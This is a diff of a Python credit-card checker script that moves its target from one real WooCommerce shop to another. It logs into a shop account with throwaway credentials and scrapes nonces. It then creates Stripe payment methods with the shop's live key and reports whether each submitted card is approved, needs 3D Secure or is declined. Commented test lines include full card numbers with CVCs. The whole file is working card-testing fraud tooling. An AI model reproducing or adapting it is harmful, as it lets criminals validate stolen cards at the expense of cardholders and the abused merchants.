@@ -1,9 +1,9 @@
 import requests
+import requests
 import re
 import random
 
-
-def Gele(ccx):
+def Tele(ccx):
     ccx = ccx.strip()
     n = ccx.split("|")[0]
     mm = ccx.split("|")[1]
@@ -12,9 +12,7 @@ def Gele(ccx):
 
     # Create a session
     session = requests.Session()
-    mail = "lilol77131@ahvin.com"
-
-    # Random user-agent
+     
     user_agents = [
         "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -25,12 +23,12 @@ def Gele(ccx):
 
 
     headers = {
-    'authority': 'curapalma.eu',
+    'authority': 'johnnysbackyard.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
     'cache-control': 'max-age=0',
     
-    'referer': 'https://curapalma.eu/en/my-account/',
+    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -42,28 +40,27 @@ def Gele(ccx):
     'user-agent': random_user_agent,
 }
 
-    response = session.get('https://curapalma.eu/en/my-account/',  headers=headers)
-
-#print(response.text)
+    response = session.get('https://johnnysbackyard.co.uk/my-account/',  headers=headers)
+  #  print(response.text)
     match = re.search(r'<input[^>]*name="woocommerce-login-nonce"[^>]*value="([^"]+)"', response.text)
     if match:
         login_nonce = match.group(1)
-        #print("Login Nonce:", login_nonce)
+        print("Login Nonce:", login_nonce)
     else:
-       # print("Login Nonce not found")
-        return "Captcha Need"
-    
+        #print("Login Nonce not found")
+        return "Captcha detech"
+
 
 
     headers = {
-    'authority': 'curapalma.eu',
+    'authority': 'johnnysbackyard.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
     'cache-control': 'max-age=0',
     'content-type': 'application/x-www-form-urlencoded',
-   
-    'origin': 'https://curapalma.eu',
-    'referer': 'https://curapalma.eu/en/my-account/',
+    
+    'origin': 'https://johnnysbackyard.co.uk',
+    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -76,24 +73,29 @@ def Gele(ccx):
 }
 
     data = {
-    'username': 'lilol77131@ahvin.com',
+    'username': 'ficada8620@baxidy.com',
     'password': 'xitioPass@1999',
     'woocommerce-login-nonce': login_nonce,
-    '_wp_http_referer': '/en/my-account/',
+    '_wp_http_referer': '/my-account/add-payment-method/',
     'login': 'Log in',
 }
 
-    response = session.post('https://curapalma.eu/en/my-account/',  headers=headers, data=data)    
+    response = session.post(
+    'https://johnnysbackyard.co.uk/my-account/',
+    
+    headers=headers,
+    data=data,
+)
 
 
 
 
     headers = {
-    'authority': 'curapalma.eu',
+    'authority': 'johnnysbackyard.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
-    
-    'referer': 'https://curapalma.eu/en/my-account/payment-methods/',
+  
+    'referer': 'https://johnnysbackyard.co.uk/my-account/payment-methods/',
     'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -105,24 +107,20 @@ def Gele(ccx):
     'user-agent': random_user_agent,
 }
 
-    response = session.get('https://curapalma.eu/en/my-account/add-payment-method/',headers=headers)
-
-#print(response.text)
-
-
+    response = session.get('https://johnnysbackyard.co.uk/my-account/add-payment-method/',  headers=headers)
+    
 # Extract nonce using regex
     match = re.search(r'"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"', response.text)
 
     if match:
         nonce = match.group(1)
-       # print("Nonce value:", nonce)
+        print("Nonce value:", nonce)
     else:
        # print("Nonce not found.")
-       return "Api Need update"
-    
-
-    
-
+        return "Api Need update"
+        
+        
+        
 
     headers = {
     'authority': 'api.stripe.com',
@@ -140,9 +138,11 @@ def Gele(ccx):
     'user-agent': random_user_agent,
 }
 
-    data = f'billing_details[name]=+&billing_details[email]=lilol77131%40ahvin.com&billing_details[address][country]=YE&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F4209db5aac%3B+stripe-js-v3%2F4209db5aac%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcurapalma.eu&time_on_page=20743&client_attribution_metadata[client_session_id]=d7a39afa-e4ab-428e-83c5-c557a300bfa8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=68029cec-b229-4b1f-8b96-bd2bd12172bc&guid=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&muid=a9bbbcfb-38dd-40ae-8819-6ccfd311e466274dda&sid=b67c53bb-2f3c-417d-817a-ee3f3e09d5963bc17e&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1R7aKRFfWEUF3znY'
+    data = f'billing_details[name]=+&billing_details[email]=ficada8620%40baxidy.com&billing_details[address][country]=YE&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F0f795842d4%3B+stripe-js-v3%2F0f795842d4%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fjohnnysbackyard.co.uk&time_on_page=26072&client_attribution_metadata[client_session_id]=051412ee-2e91-45cc-b1ad-0bc42fd652fd&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7789fc4e-0cb5-4eb0-ae4e-92877eaa8df8&guid=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&muid=06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84&sid=4bf5c3fb-20db-43f8-933a-4f1bfaa5902cbcddc7&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KQW8K2ENjnX48AP'
 
-    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+
+        
     #print(response.text)
     response_data = response.json()  # Parse the response as JSON
 
@@ -159,60 +159,55 @@ def Gele(ccx):
         
         response_json = response.json()
         id = response_json.get('id', 'No id found')
-       # print(f"Payment source created successfully. ID: {id}")
+       # print(f"Payment source created successfully. ID: {id}") 
         
-        
-        
+                       
+                                                     
 
 
     headers = {
-    'authority': 'curapalma.eu',
+    'authority': 'johnnysbackyard.co.uk',
     'accept': '*/*',
-    'accept-language': 'en-IN,en;q=0.9',
-    'origin': 'https://curapalma.eu',
-    'referer': 'https://curapalma.eu/en/my-account/add-payment-method/',
+    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
+    
+    
+    'origin': 'https://johnnysbackyard.co.uk',
+    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'user-agent': random_user_agent,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
 }
 
-# These values must be correct and fresh
     payload = {
     'action': 'create_setup_intent',
     'wcpay-payment-method': id,  # Your Stripe Payment Method ID
     '_ajax_nonce': nonce  # Must be valid for your session and page
 }
-
-    response = session.post(
-    'https://curapalma.eu/wp-admin/admin-ajax.php',
-    headers=headers,
+    response = session.post('https://johnnysbackyard.co.uk/wp-admin/admin-ajax.php',  headers=headers, data=payload)                                
     
-    data=payload
-)
 
-# Print detailed response info
-    #print(f"Status Code: {response.status_code}")
-    #print("Headers:", response.headers)
-    #print("Response Body:")
 
     data = response.json()
     main_data = data.get('data', {})
     status = main_data.get('status')
 
     if data.get('success') == True and status == 'succeeded':
-       # print("Approved")
+      #  print("Approved")
         return "Approved"
     elif data.get('success') == True and status == 'requires_action':
-        #print("3D Required")
+       # print("3D Required")
         return "3D Required"
     else:
-        #print(response.text)
-        return response.text
-# Test the function with card details in the format "card_number|mm|yy|cvc"
-#
-#print(Gele("4101650052132513|04|2028|143"))        
-    
+        message = data.get("data", {}).get("error", {}).get("message", "")
+        if "declined" in message.lower():
+          #  print("Card was Declined")
+            return "Card was Declined"
+        else:
+          #  print("Message:", message)
+            return message
+      
+#print(Tele("4258810718226890|02|2027|653"))        
